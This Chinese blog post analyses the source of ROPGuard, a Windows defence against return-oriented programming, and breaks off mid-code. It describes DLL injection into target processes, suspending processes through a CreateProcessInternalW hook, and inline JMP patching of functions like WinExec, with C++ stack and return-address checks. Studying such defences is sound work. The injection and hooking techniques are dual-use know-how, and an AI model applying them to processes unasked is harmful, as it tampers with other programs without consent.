<h1 id="4-加载器的逻辑"><a href="#4-加载器的逻辑" class="headerlink" title="4. 加载器的逻辑"></a>4. 加载器的逻辑</h1><p>源码fork在github上：</p>
<p><a href="https://github.com/showmeshell404/ropguard_cheap" target="_blank" rel="noopener">https://github.com/showmeshell404/ropguard_cheap</a></p>
<p>这个工具是通过 DLL 注入来保护目标进程的，它包括 ropguard_cheap\Release 中的这两个文件。</p>
<ul>
<li>load_rg.exe（ropguard.exe） </li>
<li>ropguard.dll（ropguarddll.dll）</li>
</ul>
<p>load_rg.exe 实质上只是一个加载器，真正关于 Anti-ROP 的逻辑都在 ropguard.dll 中。</p>
<p>用 VS 打开 ropguard\ropguard.sln 文件。这个工程中包含以下文件（ropguard_cheap）。</p>
<ul>
<li>main.cpp（load_rg\main.cpp） </li>
<li>createprocess.cpp（common\createprocess.cpp） </li>
<li>patchentrypoint.cpp（common\patchentrypoint.cpp） </li>
<li>debug.cpp（common\debug.cpp） </li>
</ul>
<p>其中 main.cpp 主要包含 main 函数以及相关逻辑，它的功能是从参数中获取进程 ID 或者可执行文件的路径，然后向目标进程注入 DLL（ropguard.dll）。</p>
<p>根据参数的不同，会分别调用下面两个函数。</p>
<ul>
<li>进程 ID ：调用 GuardExistingProcess </li>
<li>可执行文件路径：调用 CreateNewGuardedProcess </li>
</ul>
<p>这些逻辑位于 createprocess.cpp 中，在这个文件中还包含下面的逻辑。</p>
<ul>
<li>向目标进程注入 DLL </li>
<li>劫持 CreateProcessInternalW，让进程暂停运行（添加 CREATE_SUSPENDED 标志） </li>
</ul>
<p>CreateProcessInternalW 的钩子用于 DLL 中的逻辑，加载器并不使用它。在patchentrypoint.cpp，这个程序中的 PatchEntryPoint 函数可以将其他函数的入口临时改为死循环（FB FE），目的是等待 DLL 注入完成。</p>
<h1 id="5-DLL的程序逻辑"><a href="#5-DLL的程序逻辑" class="headerlink" title="5. DLL的程序逻辑"></a>5. DLL的程序逻辑</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dllmain.cpp</span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, </span></span></span><br><span class="line"><span class="function"><span class="params">					  DWORD ul_reason_for_call, </span></span></span><br><span class="line"><span class="function"><span class="params">					  LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//进行ROPGuard类的定义以及全局声明。</span></span><br><span class="line">	<span class="keyword">switch</span>(ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// read settings读取配置</span></span><br><span class="line"><span class="keyword">if</span>(!ReadROPSettings())&#123;</span><br><span class="line">	WriteLog(<span class="string">"Error: ReadROPSettings failed."</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line">WriteLog(<span class="string">"Log: ReadROPSettings ok"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// patch all critical functions给各函数打补丁</span></span><br><span class="line">PatchFunctions();</span><br><span class="line">		</span><br><span class="line">WriteLog(<span class="string">"Log: PatchFunctions ok"</span>);</span><br><span class="line">WriteLog(<span class="string">"Successfully loaded ROPGuard dll into target process"</span>);</span><br></pre></td></tr></table></figure>
<p>举例，对WinExec函数打补丁，其结果是将WinExec的开头替换成jmp指令。</p>
<p> kernel32:WinExec（打补丁前） </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">7C8623AD &gt; 8BFF           MOV EDI,EDI</span><br><span class="line">7C8623AF   55             PUSH EBP</span><br><span class="line">7C8623B0   8BEC           MOV EBP,ESP</span><br><span class="line">7C8623B2   83EC 54        SUB ESP,54</span><br><span class="line">7C8623B5   53             PUSH EBX</span><br></pre></td></tr></table></figure>
<p>将开头的5个字节改为jmp：</p>
<p>kernel32:WinExec（打补丁后）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7C8623AD &gt;-E9 4EDC2D84    JMP 00B40000</span><br><span class="line">7C8623B2   83EC 54        SUB ESP,54</span><br><span class="line">7C8623B5   53             PUSH EBX</span><br></pre></td></tr></table></figure>
<p>由于jmp指令需要占用5个字节，因此函数开头原本的内容会被覆盖。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV EDI,EDI</span><br><span class="line">PUSH EBP</span><br><span class="line">MOV EBP,ESP</span><br><span class="line">;替换成JMP 00B40000</span><br></pre></td></tr></table></figure>
<p>当调用WinExec时，程序会跳到00B40000。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; 00B40000</span><br><span class="line">00B40000   81EC 04000000  SUB ESP,4</span><br><span class="line">00B40006   60             PUSHAD</span><br><span class="line">00B40007   54             PUSH ESP</span><br><span class="line">00B40008   68 F876D329    PUSH 29D376F8</span><br><span class="line">00B4000D   E8 7E344C0F    CALL ropguard.10003490</span><br><span class="line">00B40012   81C4 24000000  ADD ESP,24</span><br><span class="line">00B40018   8BFF           MOV EDI,EDI</span><br><span class="line">00B4001A   55             PUSH EBP</span><br><span class="line">00B4001B   8BEC           MOV EBP,ESP</span><br><span class="line">00B4001D -E9 9023D27B     JMP kernel32.7C8623B2</span><br></pre></td></tr></table></figure>
<p>最后的JMP kernel32.7C8623B2会跳转到WinExec开头的jmp指令后面。</p>
<p>注意：在jmp kernel上面就是原来的6个字节。这样逻辑就恢复到原本的WinExec的逻辑。</p>
<p>中间的代码逻辑就是：判断是否被ROP运行。call roguard.10003490：调用一个检测子程序。在为各个函数打好补丁之后，当这些函数被调用的时候，就会自动运行检测子程序。</p>
<h1 id="6-CALL-RETN检查"><a href="#6-CALL-RETN检查" class="headerlink" title="6.CALL-RETN检查"></a>6.CALL-RETN检查</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ropcheck.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"ropsettings.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"debug.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//向用户显示一个消息框，通知他可能的攻击</span></span><br><span class="line"><span class="comment">//用户可以终止进程或继续正常执行</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReportPossibleROP</span><span class="params">(<span class="built_in">string</span> &amp;report)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> messageboxtext;</span><br><span class="line">	messageboxtext = <span class="string">""</span></span><br><span class="line">		<span class="string">"ROPGuard has detected a possible threat.\n"</span></span><br><span class="line">		<span class="string">"Problem details:\n\n"</span> + report;</span><br><span class="line">	</span><br><span class="line">	WriteLog((<span class="keyword">char</span> *)messageboxtext.c_str());</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(MessageBoxA(GetForegroundWindow(), </span><br><span class="line">		messageboxtext.c_str(), <span class="string">"ROPGuard"</span>, MB_OKCANCEL) == IDOK)</span><br><span class="line">	&#123;</span><br><span class="line">		ExitProcess(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">PrecededByCall</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *address)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">    <span class="comment">//判断返回的前5/3个字节是不是call，即E8</span></span><br><span class="line">	<span class="comment">// check for call opcodes ROP检查子程序，在CheckReturnAddress中调用</span></span><br><span class="line">	<span class="keyword">if</span>(*(address<span class="number">-5</span>) == <span class="number">0xE8</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(*(address<span class="number">-3</span>) == <span class="number">0xE8</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// indirect call</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>((*(address-i) == <span class="number">0xFF</span>) &amp;&amp; (((*(address-i+<span class="number">1</span>)) &amp; <span class="number">0x38</span>) == <span class="number">0x10</span>))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// performs checks on the return address of the critical function</span></span><br><span class="line"><span class="comment">// 关键功能的返回地址检查</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CheckReturnAddress</span><span class="params">(DWORD returnAddress, DWORD functionAddress, DWORD *registers)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// is return address preceded by call?</span></span><br><span class="line">	<span class="keyword">if</span>(!PrecededByCall((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)returnAddress))&#123;</span><br><span class="line">		<span class="built_in">stringstream</span> errorreport;</span><br><span class="line">		errorreport &lt;&lt; <span class="string">"Return address not preceded by call.\n"</span>;</span><br><span class="line">		errorreport &lt;&lt; <span class="string">"Return address: "</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; returnAddress;</span><br><span class="line">		ReportPossibleROP(errorreport.str());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查受保护函数的地址是否在当前返回地址上方的堆栈上</span></span><br><span class="line"><span class="comment">//如果是，这可能意味着我们“返回”了开始的关键函数而不是调用它</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CheckFunctionAddressOnStack</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> functionAddress, <span class="keyword">unsigned</span> <span class="keyword">long</span> *<span class="built_in">stack</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n = (GetROPSettings()-&gt;preserveStack) / <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>((<span class="built_in">stack</span>[i] ^ ADDR_SCRAMBLE_KEY) == functionAddress)&#123;</span><br><span class="line">			<span class="built_in">stringstream</span> errorreport;</span><br><span class="line">			errorreport &lt;&lt; <span class="string">"Address of critical function found on stack.\n"</span>;</span><br><span class="line">			errorreport &lt;&lt; <span class="string">"Stack address: "</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">stack</span>;</span><br><span class="line">			errorreport &lt;&lt; <span class="string">", Function address: "</span> &lt;&lt; (functionAddress ^ ADDR_SCRAMBLE_KEY);</span><br><span class="line">			ReportPossibleROP(errorreport.str());</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得堆栈的顶部和底部地址</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetStackInfo</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *stackBottom, <span class="keyword">unsigned</span> <span class="keyword">long</span> *stackTop)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *TIB = (<span class="keyword">char</span> *)__readfsdword(<span class="number">0x18</span>);</span><br><span class="line">	*stackTop = *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(TIB+<span class="number">4</span>));</span><br><span class="line">	*stackBottom = *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(TIB+<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对关键功能框架下方的堆栈帧执行检查</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CheckStackFrames</span><span class="params">(DWORD *stackPtr, DWORD *framePtr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD *originalFramePtr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> stackBottom, stackTop;</span><br><span class="line">	GetStackInfo(&amp;stackBottom, &amp;stackTop);</span><br><span class="line"></span><br><span class="line">	originalFramePtr = framePtr;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// frame pointer must point to the stack</span></span><br><span class="line">	<span class="keyword">if</span>(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)framePtr &lt; stackBottom) || (stackTop &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)framePtr))&#123;</span><br><span class="line">		<span class="built_in">stringstream</span> errorreport;</span><br><span class="line">		errorreport &lt;&lt; <span class="string">"Return address not preceded by call.\n"</span>;</span><br><span class="line">		errorreport &lt;&lt; <span class="string">"Frame pointer: "</span>;</span><br><span class="line">		errorreport &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)framePtr;</span><br><span class="line">		ReportPossibleROP(errorreport.str());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// frame pointer must be "below" the stack pointer</span></span><br><span class="line">	<span class="keyword">if</span>(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)framePtr) &lt; ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)stackPtr))&#123;</span><br><span class="line">		<span class="built_in">stringstream</span> errorreport;</span><br><span class="line">		errorreport &lt;&lt; <span class="string">"Frame pointer is above stack pointer on stack\n"</span>;</span><br><span class="line">		errorreport &lt;&lt; <span class="string">"Stack pointer: "</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stackPtr;</span><br><span class="line">		errorreport &lt;&lt; <span class="string">", Frame pointer: "</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)framePtr;</span><br><span class="line">		ReportPossibleROP(errorreport.str());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 表示应该执行检查</span></span><br><span class="line"><span class="keyword">bool</span> protectionEnabled;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行检查的主要功能，在每个关键功能的序言中调用</span></span><br><span class="line"><span class="comment">// functionAddress：关键函数的原始地址，用于确定我们所处的函数</span></span><br><span class="line"><span class="comment">// registers：一个包含关键函数调用时刻的寄存器值的数组</span></span><br><span class="line"><span class="keyword">void</span> __<span class="function">stdcall <span class="title">ROPCheck</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> functionAddress, <span class="keyword">unsigned</span> <span class="keyword">long</span> *registers)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!protectionEnabled)</span><br><span class="line">		<span class="keyword">return</span>; <span class="comment">// still initializing protection</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> framePointer = registers[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> stackPointer = registers[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// identify the function that is being called</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> numFunctions = GetNumGuardedFunctions();</span><br><span class="line">	ROPGuardedFunction *guardedFunctions = GetGuardedFunctions();</span><br><span class="line">	ROPGuardedFunction *currentFunction = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; numFunctions; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(guardedFunctions[i].originalAddress == functionAddress)&#123;</span><br><span class="line">			currentFunction = &amp;(guardedFunctions[i]);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!currentFunction)&#123;</span><br><span class="line">		WriteLog(<span class="string">"Inside ROPCheck, but guarded function not identified"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//if(strcmp(currentFunction-&gt;functionName, "CreateProcessInternalW") == 0)</span></span><br><span class="line">	<span class="comment">//	return;</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// check critical function on stack </span></span><br><span class="line">	<span class="keyword">if</span>(!CheckFunctionAddressOnStack(functionAddress, (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)stackPointer))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// check return address</span></span><br><span class="line">	DWORD returnAddress = *((DWORD *)(stackPointer + GetROPSettings()-&gt;preserveStack));</span><br><span class="line">	<span class="keyword">if</span>(!CheckReturnAddress(returnAddress, functionAddress, registers))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// check ebp</span></span><br><span class="line">	<span class="keyword">if</span>(!CheckStackFrames((DWORD *)(stackPointer + GetROPSettings()-&gt;preserveStack), (DWORD *)framePointer))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>防止误判，必须考虑到所有不同长度的call指令以及不同的指令。还可以检查当前所在地址是否就是call的目标地址。比如 call eax时，可以检查eax和eip的值是否一致。</p>
<p>还需要检查栈的合法性：如可以获取栈的地址范围，并检查esp，ebp寄存器的值是否位于该范围内，也能够识别异常。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可以获得栈的上限和下限地址，并检查esp是否位于该范围内。此逻辑也可用于检查ebp。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CheckStackPointer</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> stackPtr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stackBottom, stackTop;</span><br><span class="line">    GetStackInfo(&amp;stackBottom, &amp;stackTop);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((stackPtr &lt; stackBottom) || (stackTop &lt; stackPtr))&#123;</span><br><span class="line">        <span class="built_in">stringstream</span> errorreport;</span><br><span class="line">        errorreport &lt;&lt; <span class="string">"Stack pointer is "</span>;</span><br><span class="line">        errorreport &lt;&lt; <span class="string">"outside of stack. Stack address:\n"</span>;</span><br><span class="line">        errorreport &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; stackPtr;</span><br><span class="line">        ReportPossibleROP(errorreport.str());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于栈永远是向下（低位方向）增长的，因此 ebp 必然要大于 esp，也可以对这一点进行检查。函数的返回目标地址是存放在栈中的，因此我们可以通过 ebp 进行回溯，找到上一个和再上一个返回目标地址。</p>
<p>这种方法被称为栈跟踪（stack trace）。通过栈跟踪，我们可以确认调用中的各个 ebp 是否位于栈的地址范围内。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>; i&lt;GetROPSettings()-&gt;maxStackFrames; i++)&#123;</span><br><span class="line">        newFramePtr = (DWORD *)(*(framePtr));</span><br><span class="line">        returnAddress = (DWORD *)(*(framePtr+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!returnAddress) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!PrecededByCall((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)returnAddress)) &#123;</span><br><span class="line">            <span class="built_in">stringstream</span> errorreport;</span><br><span class="line">            errorreport &lt;&lt; <span class="string">"Return address not preceded by call."</span>;</span><br><span class="line">            errorreport &lt;&lt; <span class="string">" Return address: "</span>;</span><br><span class="line">            errorreport &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">returnAddress;</span><br><span class="line">            errorreport &lt;&lt; <span class="string">" Frame pointer: "</span>;</span><br><span class="line">            errorreport &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)framePtr;</span><br><span class="line">            errorreport &lt;&lt; <span class="string">" Original frame pointer: "</span>;</span><br><span class="line">            errorreport &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">originalFramePtr;</span><br><span 